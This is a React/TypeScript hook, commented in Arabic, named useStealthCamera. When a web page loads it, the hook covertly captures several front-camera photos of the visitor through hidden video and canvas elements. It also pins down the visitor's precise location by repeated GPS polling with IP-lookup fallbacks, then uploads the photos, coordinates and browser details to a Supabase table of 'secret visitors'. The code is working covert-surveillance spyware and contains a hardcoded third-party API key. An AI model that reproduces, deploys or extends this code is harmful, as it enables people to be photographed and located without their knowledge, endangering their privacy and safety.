import { useState, useRef, useCallback } from 'react';
import { supabaseHelpers, TABLES } from '@/lib/supabase';

// تعريف واجهات البيانات
interface CapturedPhoto {
  id: string;
  dataUrl: string;
  timestamp: Date;
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: Date;
  // إضافة حقول جديدة للمزيد من المعلومات
  provider?: string; // مزود خدمة الموقع (GPS, NETWORK, IP)
  altitude?: number; // الارتفاع إذا كان متاحًا
  altitudeAccuracy?: number; // دقة الارتفاع
  heading?: number; // الاتجاه
  speed?: number; // السرعة
  errorMessage?: string; // رسالة الخطأ إن وجدت
}

interface VisitorData {
  id: string;
  photos: CapturedPhoto[];
  location: LocationData | null;
  visitTime: Date;
  userAgent: string;
}

export const useStealthCamera = () => {
  const [isCapturing, setIsCapturing] = useState(false);
  const [capturedPhotos, setCapturedPhotos] = useState<CapturedPhoto[]>([]);
  const [currentPhotoIndex, setCurrentPhotoIndex] = useState(0);
  const [visitorData, setVisitorData] = useState<VisitorData | null>(null);
  
  // استخدام refs للعناصر المخفية
  const streamRef = useRef<MediaStream | null>(null);

  // الحصول على الموقع من خلال IP (كخيار احتياطي)
  const fetchLocationFromIpApi = useCallback(async (): Promise<LocationData> => {
    try {
      // استخدام خدمة عامة للحصول على الموقع من IP
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      if (data && data.latitude && data.longitude) {
        return {
          latitude: data.latitude,
          longitude: data.longitude,
          accuracy: 5000, // دقة منخفضة: ~5 كم للموقع المستند إلى IP
          timestamp: new Date(),
          provider: 'ip',
          errorMessage: undefined
        };
      }
      throw new Error('بيانات الموقع غير متوفرة من مزود خدمة IP');
    } catch (error) {
      console.error('❌ فشل في الحصول على الموقع من IP:', error);
      
      // محاولة استخدام مزود خدمة آخر للـ IP
      try {
        const fallbackResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=d9c8ca199b734f43b81bef0309d42ce9');
        const fallbackData = await fallbackResponse.json();
        
        if (fallbackData && fallbackData.latitude && fallbackData.longitude) {
          return {
            latitude: parseFloat(fallbackData.latitude),
            longitude: parseFloat(fallbackData.longitude),
            accuracy: 5000, // دقة منخفضة
            timestamp: new Date(),
            provider: 'ip-fallback',
            errorMessage: undefined
          };
        }
      } catch (fallbackError) {
        console.error('❌ فشل في الحصول على الموقع من IP البديل:', fallbackError);
      }
      
      // إرجاع موقع افتراضي عند فشل جميع المحاولات
      return {
        latitude: 0,
        longitude: 0,
        accuracy: 10000, // دقة منخفضة جداً
        timestamp: new Date(),
        provider: 'ip-error',
        errorMessage: 'تعذر الحصول على الموقع من خدمات IP'
      };
    }
  }, []);

  // وظيفة جديدة لتتبع الموقع بشكل مستمر
  const watchLocation = useCallback((): Promise<LocationData> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        console.error('❌ خدمة تحديد الموقع غير مدعومة');
        resolve({
          latitude: 0,
          longitude: 0,
          accuracy: 1000,
          timestamp: new Date(),
          provider: 'not-supported',
          errorMessage: 'خدمة تحديد الموقع غير مدعومة'
        });
        return;
      }

      console.log('🔄 بدء تتبع الموقع المستمر...');
      
      let bestLocation: LocationData | null = null;
      let watchId: number;
      let timeout: NodeJS.Timeout;
      let resolved = false;

      const options: PositionOptions = {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      };

      watchId = navigator.geolocation.watchPosition(
        (position) => {
          if (resolved) return;

          const locationData: LocationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || undefined,
            altitudeAccuracy: position.coords.altitudeAccuracy || undefined,
            heading: position.coords.heading || undefined,
            speed: position.coords.speed || undefined,
            timestamp: new Date(),
            provider: 'watch-gps'
          };

          console.log(`📍 تحديث الموقع: دقة ${position.coords.accuracy.toFixed(0)}م`);

          // تحديث أفضل موقع إذا كان أكثر دقة
          if (!bestLocation || position.coords.accuracy < bestLocation.accuracy) {
            bestLocation = locationData;
            console.log(`✅ موقع أفضل من التتبع: دقة ${position.coords.accuracy.toFixed(0)}م`);
          }

          // إنهاء التتبع عند الحصول على دقة عالية
          if (position.coords.accuracy < 20) {
            resolved = true;
            navigator.geolocation.clearWatch(watchId);
            clearTimeout(timeout);
            console.log('✅ تم الحصول على موقع عالي الدقة من التتبع');
            resolve(locationData);
          }
        },
        (error) => {
          console.warn('⚠️ خطأ في تتبع الموقع:', error.message);
          if (!resolved && bestLocation) {
            resolved = true;
            navigator.geolocation.clearWatch(watchId);
            clearTimeout(timeout);
            resolve(bestLocation);
          }
        },
        options
      );

      // إنهاء التتبع بعد 15 ثانية واستخدام أفضل موقع متاح
      timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          navigator.geolocation.clearWatch(watchId);
          
          if (bestLocation) {
            console.log('⏱️ انتهت مهلة التتبع - استخدام أفضل موقع');
            resolve(bestLocation);
          } else {
            console.warn('⏱️ انتهت مهلة التتبع بدون موقع');
            resolve({
              latitude: 0,
              longitude: 0,
              accuracy: 1000,
              timestamp: new Date(),
              provider: 'watch-timeout',
              errorMessage: 'انتهت مهلة تتبع الموقع'
            });
          }
        }
      }, 15000);
    });
  }, []);

  // بدء الكاميرا المخفية
  const startStealthCamera = useCallback(async () => {
    try {
      console.log('🎯 محاولة الوصول للكاميرا...');
      
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user'
        },
        audio: false
      });
      
      streamRef.current = stream;
      console.log('✅ تم الحصول على stream الكاميرا');
      return stream;
    } catch (error) {
      console.error('❌ فشل في الوصول للكاميرا:', error);
      return null;
    }
  }, []);

  // إيقاف الكاميرا
  const stopStealthCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
      console.log('🛑 تم إيقاف الكاميرا');
    }
  }, []);

  // التقاط صورة باستخدام stream مباشرة
  const captureStealthPhoto = useCallback(async (stream: MediaStream) => {
    return new Promise<CapturedPhoto | null>((resolve) => {
      try {
        // إنشاء video element مؤقت
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        video.onloadedmetadata = () => {
          video.play();
          
          // انتظار حتى يصبح الفيديو جاهز
          setTimeout(() => {
            try {
              // إنشاء canvas للتقاط الصورة
              const canvas = document.createElement('canvas');
              const context = canvas.getContext('2d');
              
              if (!context) {
                resolve(null);
                return;
              }
              
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              
              // رسم الفيديو على الكانفاس
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              // تحويل إلى صورة
              const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
              
              // التحقق من أن الصورة ليست فارغة
              if (dataUrl && dataUrl.length > 100) {
                const photo: CapturedPhoto = {
                  id: `stealth_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                  dataUrl,
                  timestamp: new Date()
                };
                
                console.log('✅ تم التقاط صورة بنجاح:', photo.id);
                resolve(photo);
              } else {
                console.warn('⚠️ الصورة فارغة أو غير صحيحة');
                resolve(null);
              }
            } catch (error) {
              console.error('❌ خطأ في التقاط الصورة:', error);
              resolve(null);
            }
          }, 1000); // انتظار ثانية واحدة
        };
        
        video.onerror = () => {
          console.error('❌ خطأ في تحميل الفيديو');
          resolve(null);
        };
      } catch (error) {
        console.error('❌ خطأ عام في التقاط الصورة:', error);
        resolve(null);
      }
    });
  }, []);

  // الحصول على الموقع باستخدام عدة طرق مختلفة لضمان دقة عالية
  const getCurrentLocation = useCallback((): Promise<LocationData> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        console.error('❌ خدمة تحديد الموقع (Geolocation) غير مدعومة في هذا المتصفح');
        
        // في حالة عدم دعم المتصفح لـ Geolocation، محاولة استخدام طريقة بديلة
        fetchLocationFromIpApi()
          .then(ipLocation => {
            resolve(ipLocation);
          })
          .catch(() => {
            resolve({
              latitude: 0,
              longitude: 0,
              accuracy: 1000,
              timestamp: new Date(),
              provider: 'fallback',
              errorMessage: 'تعذر الوصول إلى الموقع - خدمة تحديد الموقع غير مدعومة'
            });
          });
        return;
      }

      console.log('📍 بدء محاولات الحصول على الموقع من عدة مصادر...');
      
      // متغيرات لتخزين أفضل موقع تم الحصول عليه
      let bestAccuracy = Infinity;
      let bestPosition: GeolocationPosition | null = null;
      let attempts = 0;
      const maxAttempts = 12; // زيادة عدد المحاولات
      let locationSuccessful = false;
      
      // جمع النتائج من عدة مصادر
      let gpsLocation: LocationData | null = null;
      let networkLocation: LocationData | null = null;
      let ipLocation: LocationData | null = null;

      // محاولة الحصول على الموقع من IP (احتياطي)
      fetchLocationFromIpApi().then(location => {
        ipLocation = location;
        console.log('🌐 تم الحصول على موقع تقريبي من عنوان IP:', {
          latitude: location.latitude.toFixed(6),
          longitude: location.longitude.toFixed(6),
          accuracy: location.accuracy.toFixed(0) + 'م'
        });
      }).catch(error => {
        console.warn('⚠️ فشل في الحصول على الموقع من IP:', error);
      });

      // وظيفة متكررة للحصول على الموقع
      const tryGetLocation = (highAccuracy: boolean = true) => {
        console.log(`🔄 محاولة ${attempts + 1} - ${highAccuracy ? 'GPS عالي الدقة' : 'شبكة'}`);
        
        const options: PositionOptions = {
          enableHighAccuracy: highAccuracy,
          timeout: highAccuracy ? 15000 : 10000,
          maximumAge: highAccuracy ? 0 : 30000
        };
        
        navigator.geolocation.getCurrentPosition(
          (position) => {
            attempts++;
            const currentAccuracy = position.coords.accuracy;
            const provider = highAccuracy ? 'gps' : 'network';
            
            console.log(`📍 محاولة ${attempts} (${provider}): دقة ${currentAccuracy.toFixed(0)}م`);
            
            // تخزين الموقع حسب المصدر
            const locationData: LocationData = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: currentAccuracy,
              altitude: position.coords.altitude || undefined,
              altitudeAccuracy: position.coords.altitudeAccuracy || undefined,
              heading: position.coords.heading || undefined,
              speed: position.coords.speed || undefined,
              timestamp: new Date(),
              provider
            };
            
            if (provider === 'gps') {
              gpsLocation = locationData;
            } else {
              networkLocation = locationData;
            }
            
            // تحديث أفضل موقع إذا كان أكثر دقة
            if (currentAccuracy < bestAccuracy && currentAccuracy > 0) {
              bestAccuracy = currentAccuracy;
              bestPosition = position;
              console.log(`✅ موقع أفضل (${provider}): دقة ${bestAccuracy.toFixed(0)}م`);
            }

            // شروط إنهاء البحث:
            // 1. دقة عالية جداً (أقل من 10 متر)
            // 2. دقة جيدة ومحاولات كافية
            // 3. وصول للحد الأقصى من المحاولات
            const isVeryAccurate = currentAccuracy < 10;
            const isGoodEnough = currentAccuracy < 50 && attempts >= 4;
            const maxAttemptsReached = attempts >= maxAttempts;
            
            if (isVeryAccurate || isGoodEnough || maxAttemptsReached) {
              if (!locationSuccessful) {
                locationSuccessful = true;
                
                const result: LocationData = {
                  latitude: bestPosition!.coords.latitude,
                  longitude: bestPosition!.coords.longitude,
                  accuracy: bestPosition!.coords.accuracy,
                  altitude: bestPosition!.coords.altitude || undefined,
                  altitudeAccuracy: bestPosition!.coords.altitudeAccuracy || undefined,
                  heading: bestPosition!.coords.heading || undefined,
                  speed: bestPosition!.coords.speed || undefined,
                  timestamp: new Date(),
                  provider: highAccuracy ? 'gps' : 'network'
                };
                
                console.log('✅ تم الحصول على الموقع النهائي:', {
                  provider: result.provider,
                  latitude: result.latitude.toFixed(8),
                  longitude: result.longitude.toFixed(8),
                  accuracy: `${result.accuracy.toFixed(1)}م`,
                  reason: isVeryAccurate ? 'دقة عالية' : isGoodEnough ? 'دقة جيدة' : 'حد أقصى محاولات'
                });
                
                resolve(result);
              }
            } else {
              // محاولة أخرى مع تبديل وضع الدقة
              setTimeout(() => {
                if (!locationSuccessful) {
                  tryGetLocation(attempts % 2 === 0); // تبديل بين عالي الدقة والعادي
                }
              }, 2000);
            }
          },
          (error) => {
            attempts++;
            console.warn(`⚠️ فشل في المحاولة ${attempts} (${highAccuracy ? 'GPS' : 'شبكة'}):`, error.message);
            
            // تجربة وضع مختلف إذا فشل الوضع الحالي
            if (attempts < maxAttempts && !locationSuccessful) {
              setTimeout(() => {
                tryGetLocation(!highAccuracy); // تغيير وضع الدقة
              }, 1500);
            } else if (attempts >= maxAttempts && !locationSuccessful) {
              // استخدام أفضل موقع متاح أو الاحتياطيين
              locationSuccessful = true;
              
              if (bestPosition) {
                const result: LocationData = {
                  latitude: bestPosition.coords.latitude,
                  longitude: bestPosition.coords.longitude,
                  accuracy: bestPosition.coords.accuracy,
                  timestamp: new Date(),
                  provider: 'fallback-geolocation',
                  errorMessage: 'تم استخدام أفضل موقع متاح'
                };
                console.log('⚠️ استخدام أفضل موقع متاح:', result);
                resolve(result);
              } else if (gpsLocation) {
                console.log('⚠️ استخدام موقع GPS الاحتياطي');
                resolve({
                  ...gpsLocation,
                  errorMessage: 'تم استخدام موقع GPS احتياطي'
                });
              } else if (networkLocation) {
                console.log('⚠️ استخدام موقع الشبكة الاحتياطي');
                resolve({
                  ...networkLocation,
                  errorMessage: 'تم استخدام موقع الشبكة احتياطي'
                });
              } else if (ipLocation) {
                console.log('⚠️ استخدام موقع IP الاحتياطي');
                resolve({
                  ...ipLocation,
                  errorMessage: 'تم استخدام موقع IP احتياطي'
                });
              } else {
                console.error('❌ فشل في الحصول على الموقع من جميع المصادر');
                resolve({
                  latitude: 0,
                  longitude: 0,
                  accuracy: 1000,
                  timestamp: new Date(),
                  provider: 'error',
                  errorMessage: 'تعذر الحصول على الموقع من جميع المصادر'
                });
              }
            }
          },
          options
        );
      };

      // بدء المحاولات بوضع عالي الدقة
      tryGetLocation(true);
      
      // محاولة إضافية بوضع الشبكة بعد 3 ثوان
      setTimeout(() => {
        if (!locationSuccessful && attempts < 2) {
          tryGetLocation(false);
        }
      }, 3000);
      
      // تعيين مهلة نهائية لضمان العودة بموقع
      setTimeout(() => {
        if (!locationSuccessful) {
          locationSuccessful = true;
          console.warn('⏱️ انتهت المهلة الزمنية للحصول على الموقع');
          
          // استخدام أي موقع متاح (بالترتيب: أفضل موقع ثم GPS ثم الشبكة ثم IP)
          if (bestPosition) {
            console.log('⚠️ استخدام أفضل موقع بعد انتهاء المهلة');
            resolve({
              latitude: bestPosition.coords.latitude,
              longitude: bestPosition.coords.longitude,
              accuracy: bestPosition.coords.accuracy,
              timestamp: new Date(),
              provider: 'timeout-best',
              errorMessage: 'تم استخدام أفضل موقع بعد انتهاء المهلة'
            });
          } else if (gpsLocation) {
            console.log('⚠️ استخدام موقع GPS بعد انتهاء المهلة');
            resolve({
              ...gpsLocation,
              errorMessage: 'تم استخدام موقع GPS بعد انتهاء المهلة'
            });
          } else if (networkLocation) {
            console.log('⚠️ استخدام موقع الشبكة بعد انتهاء المهلة');
            resolve({
              ...networkLocation,
              errorMessage: 'تم استخدام موقع الشبكة بعد انتهاء المهلة'
            });
          } else if (ipLocation) {
            console.log('⚠️ استخدام موقع IP بعد انتهاء المهلة');
            resolve({
              ...ipLocation,
              errorMessage: 'تم استخدام موقع IP بعد انتهاء المهلة'
            });
          } else {
            console.error('❌ فشل في الحصول على الموقع بعد انتهاء المهلة');
            resolve({
              latitude: 0,
              longitude: 0,
              accuracy: 1000,
              timestamp: new Date(),
              provider: 'timeout-error',
              errorMessage: 'تعذر الحصول على الموقع بعد انتهاء المهلة'
            });
          }
        }
      }, 25000); // مهلة نهائية: 25 ثانية
    });
  }, [fetchLocationFromIpApi]);

  // بدء التقاط تلقائي سري
  const startStealthCapture = useCallback(async (photoCount: number = 5) => {
    if (isCapturing) {
      console.log('⚠️ التقاط جاري بالفعل');
      return [];
    }

    console.log('🚀 بدء النظام السري - عدد الصور:', photoCount);
    setIsCapturing(true);
    setCapturedPhotos([]);
    setCurrentPhotoIndex(0);

    // بدء الكاميرا
    const stream = await startStealthCamera();
    if (!stream) {
      console.error('❌ فشل في بدء الكاميرا');
      setIsCapturing(false);
      return [];
    }

    console.log('✅ الكاميرا جاهزة، بدء التقاط الصور...');
    
    // انتظار إضافي لاستقرار الكاميرا
    await new Promise(resolve => setTimeout(resolve, 1000));

    const photos: CapturedPhoto[] = [];
    
    // التقاط الصور
    for (let i = 0; i < photoCount; i++) {
      setCurrentPhotoIndex(i + 1);
      console.log(`📸 التقاط الصورة ${i + 1}/${photoCount}`);
      
      const photo = await captureStealthPhoto(stream);
      
      if (photo) {
        photos.push(photo);
        setCapturedPhotos(prev => [...prev, photo]);
        
        // حفظ الصورة فوراً
        try {
          localStorage.setItem(`stealth_photo_${photo.id}`, photo.dataUrl);
          console.log(`💾 تم حفظ الصورة ${i + 1}`);
        } catch (error) {
          console.error(`❌ فشل في حفظ الصورة ${i + 1}:`, error);
        }
      } else {
        console.warn(`⚠️ فشل في التقاط الصورة ${i + 1}`);
      }
      
      // انتظار بين الصور
      if (i < photoCount - 1) {
        await new Promise(resolve => setTimeout(resolve, 800));
      }
    }

    // إيقاف الكاميرا
    stopStealthCamera();
    setIsCapturing(false);

    console.log(`🏁 انتهى التقاط الصور. تم التقاط ${photos.length}/${photoCount} صورة`);
    return photos;
  }, [isCapturing, startStealthCamera, stopStealthCamera, captureStealthPhoto]);

  // حفظ بيانات الزائر مع استخدام التتبع المحسن للموقع
  const saveVisitorData = useCallback(async (photos: CapturedPhoto[]) => {
    try {
      console.log('💾 بدء حفظ بيانات الزائر...');
      
      // محاولة الحصول على الموقع باستخدام التتبع المستمر أولاً
      let location: LocationData;
      try {
        console.log('🔄 محاولة التتبع المستمر للموقع...');
        location = await watchLocation();
        
        // إذا كانت دقة التتبع المستمر منخفضة، جرب الطريقة التقليدية
        if (location.accuracy > 100 || location.latitude === 0) {
          console.log('🔄 دقة التتبع المستمر منخفضة، تجربة الطريقة التقليدية...');
          const fallbackLocation = await getCurrentLocation();
          
          // استخدم الموقع الأكثر دقة
          if (fallbackLocation.accuracy < location.accuracy && fallbackLocation.latitude !== 0) {
            location = fallbackLocation;
            console.log('✅ تم استخدام الموقع من الطريقة التقليدية (أكثر دقة)');
          }
        }
      } catch (error) {
        console.warn('⚠️ فشل في التتبع المستمر، تجربة الطريقة التقليدية:', error);
        location = await getCurrentLocation();
      }
      
      const visitor: VisitorData = {
        id: `stealth_visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        photos,
        location,
        visitTime: new Date(),
        userAgent: navigator.userAgent
      };

      console.log('📝 بيانات الزائر:', {
        id: visitor.id,
        photosCount: visitor.photos.length,
        location: visitor.location ? {
          provider: visitor.location.provider,
          accuracy: `${visitor.location.accuracy.toFixed(1)}م`,
          coordinates: `${visitor.location.latitude.toFixed(6)}, ${visitor.location.longitude.toFixed(6)}`
        } : 'غير متوفر',
        visitTime: visitor.visitTime
      });

      // محاولة حفظ البيانات في Supabase أولاً
      let savedToSupabase = false;
      try {
        await supabaseHelpers.addVisitor(TABLES.STEALTH_VISITORS, visitor);
        console.log('✅ تم حفظ بيانات الزائر السري في Supabase');
        savedToSupabase = true;
      } catch (supabaseError) {
        console.warn('⚠️ فشل في حفظ البيانات في Supabase، سيتم الحفظ محلياً:', supabaseError);
      }

      // حفظ البيانات محلياً دائماً كنسخة احتياطية
      try {
        const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
        existingVisitors.push({
          ...visitor,
          savedToSupabase
        });
        localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
        console.log('💾 تم حفظ بيانات الزائر السري محلياً');
      } catch (localError) {
        console.error('❌ فشل في الحفظ المحلي:', localError);
      }

      setVisitorData(visitor);
      return visitor;
    } catch (error) {
      console.error('❌ خطأ في حفظ بيانات الزائر:', error);
      return null;
    }
  }, [getCurrentLocation, watchLocation]);

  // الحصول على جميع الزوار
  const getAllVisitors = useCallback(async (): Promise<VisitorData[]> => {
    try {
      console.log('📖 جاري تحميل بيانات الزوار السريين...');
      
      // محاولة الحصول على البيانات من Supabase أولاً
      const supabaseVisitors = await supabaseHelpers.getVisitors(TABLES.STEALTH_VISITORS);
      
      // الحصول على بيانات localStorage كنسخة احتياطية
      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      const localVisitors = localData.map((visitor: any) => ({
        ...visitor,
        visitTime: new Date(visitor.visitTime),
        photos: visitor.photos.map((photo: any) => ({
          ...photo,
          timestamp: new Date(photo.timestamp)
        })),
        location: visitor.location ? {
          ...visitor.location,
          timestamp: new Date(visitor.location.timestamp)
        } : null
      }));

      // دمج المصدرين، مع إعطاء أولوية لبيانات Supabase
      const allVisitors = [...supabaseVisitors, ...localVisitors];
      
      // إزالة التكرارات بناءً على المعرف
      const uniqueVisitors = allVisitors.reduce((acc: any[], current: any) => {
        const exists = acc.find(visitor => visitor.id === current.id);
        if (!exists) {
          acc.push(current);
        }
        return acc;
      }, []);

      // الفرز حسب وقت الزيارة (الأحدث أولاً)
      uniqueVisitors.sort((a, b) => new Date(b.visitTime).getTime() - new Date(a.visitTime).getTime());

      console.log(`✅ تم تحميل ${uniqueVisitors.length} زائر سري (${supabaseVisitors.length} من Supabase + ${localVisitors.length} محلي)`);
      return uniqueVisitors;
    } catch (error) {
      console.error('❌ خطأ في تحميل البيانات:', error);
      
      // العودة إلى localStorage فقط كنسخة احتياطية
      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      return localData.map((visitor: any) => ({
        ...visitor,
        visitTime: new Date(visitor.visitTime),
        photos: visitor.photos.map((photo: any) => ({
          ...photo,
          timestamp: new Date(photo.timestamp)
        })),
        location: visitor.location ? {
          ...visitor.location,
          timestamp: new Date(visitor.location.timestamp)
        } : null
      }));
    }
  }, []);

  // مسح جميع البيانات
  const clearAllData = useCallback(async () => {
    try {
      // مسح البيانات من Supabase
      await supabaseHelpers.deleteAllVisitors(TABLES.STEALTH_VISITORS);
      console.log('🗑️ تم مسح جميع البيانات السرية من Supabase');
    } catch (error) {
      console.error('❌ خطأ في مسح البيانات من Supabase:', error);
    }
    
    // مسح البيانات المحلية أيضاً
    try {
      localStorage.removeItem('stealth_visitors');
      
      // مسح جميع الصور
      Object.keys(localStorage).forEach(key => {
        if (key.startsWith('stealth_photo_')) {
          localStorage.removeItem(key);
        }
      });
      
      setCapturedPhotos([]);
      setVisitorData(null);
      console.log('🗑️ تم مسح جميع البيانات السرية المحلية');
    } catch (error) {
      console.error('❌ خطأ في مسح البيانات المحلية:', error);
    }
  }, []);

  return {
    // الحالات
    isCapturing,
    capturedPhotos,
    currentPhotoIndex,
    visitorData,
    
    // الوظائف
    startStealthCapture,
    saveVisitorData,
    getAllVisitors,
    clearAllData
  };
};